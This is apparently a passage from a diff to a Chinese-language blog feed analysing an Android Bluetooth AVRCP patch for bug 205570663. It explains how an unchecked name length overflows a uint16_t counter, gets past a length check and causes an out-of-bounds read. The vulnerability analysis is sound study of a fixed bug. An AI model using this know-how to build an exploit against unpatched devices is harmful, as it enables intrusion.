+               BE_STREAM_TO_ARRAY(p, attr_entry-&gt;name.p_str,
+@@ -444,8 +450,14 @@
+         BE_STREAM_TO_UINT32(attr_entry-&gt;attr_id, p);
+         BE_STREAM_TO_UINT16(attr_entry-&gt;name.charset_id, p);
+         BE_STREAM_TO_UINT16(attr_entry-&gt;name.str_len, p);
++        if (static_cast&lt;uint16_t&gt;(min_len + attr_entry-&gt;name.str_len) &lt;
++            min_len) {
++          // Check for overflow
++          android_errorWriteLog(0x534e4554, &quot;205570663&quot;);
++        }
++        if (pkt_len - min_len &lt; attr_entry-&gt;name.str_len)
++          goto browse_length_error;
+         min_len += attr_entry-&gt;name.str_len;
+-        if (pkt_len &lt; min_len) goto browse_length_error;
+         attr_entry-&gt;name.p_str =
+             (uint8_t*)osi_malloc(attr_entry-&gt;name.str_len * sizeof(uint8_t));
+         BE_STREAM_TO_ARRAY(p, attr_entry-&gt;name.p_str, attr_entry-&gt;name.str_len);
+@@ -815,8 +827,12 @@
+           BE_STREAM_TO_UINT32(p_attrs[i].attr_id, p);
+           BE_STREAM_TO_UINT16(p_attrs[i].name.charset_id, p);
+           BE_STREAM_TO_UINT16(p_attrs[i].name.str_len, p);
+-          min_len += p_attrs[i].name.str_len;
+-          if (len &lt; min_len) {
++          if (static_cast&lt;uint16_t&gt;(min_len + p_attrs[i].name.str_len) &lt;
++              min_len) {
++            // Check for overflow
++            android_errorWriteLog(0x534e4554, &quot;205570663&quot;);
++          }
++          if (len - min_len &lt; p_attrs[i].name.str_len) {
+             for (int j = 0; j &lt; i; j++) {
+               osi_free(p_attrs[j].name.p_str);
+             }
+@@ -824,6 +840,7 @@
+             p_result-&gt;get_attrs.num_attrs = 0;
+             goto length_error;
+           }
++          min_len += p_attrs[i].name.str_len;
+           if (p_attrs[i].name.str_len &gt; 0) {
+             p_attrs[i].name.p_str =
+                 (uint8_t*)osi_calloc(p_attrs[i].name.str_len);
+</code></pre>
+<h2 id="分析">分析</h2>
+<p>下图为hanzinuo大神的PPT，看这一页很容易理解：</p>
+<ul>
+<li><code>min_len</code>是一个<code>uint16_t</code>类型的变量，初始值为0，然后+8</li>
+<li>从packet解析得到变量<code>attr_entyr-&gt;name.str_len</code>，该变量的取值范围是<code>0～UINT16_MAX</code></li>
+<li>将<code>attr_entyr-&gt;name.str_len</code>的值添加到<code>min_len</code>，因为这里没有做判断，所以如果<code>attr_entyr-&gt;name.str_len</code>很大，那么就可能导致整数溢出</li>
+<li>下一行的if判断中，是想要判断packet是否<code>&gt;=min_len</code>，如果满足就继续往下走。而前面如果发生整数溢出，那么<code>min_len</code>变得很小，就会绕过这个检查</li>
+<li>接着，malloc分配的chunk的大小是<code>attr_entyr-&gt;name.str_len</code>，会大于packet的实际长度，就会导致OOB Read</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://lzxzl.github.io/post-images/1694962900193.png" alt="" loading="lazy"></figure>
+<p>再来看看patch，好像和ppt里有点对不上？<br>
+不过单看patch也能看明白：在三处<code>BE_STREAM_TO_UINT16(p_attrs[i].name.str_len, p);</code>后面都添加了长度检查，这个不难理解。<br>
+我唯一不理解的就是第一处patch把一个<code>min_len</code>从int改成了<code>uint_16</code>？这是为啥？改错了？我看了一下main分支的代码，所有<code>min_len</code>都改成了<code>uint32_t</code>。</p>
+]]></content>
+    </entry>
+</feed>
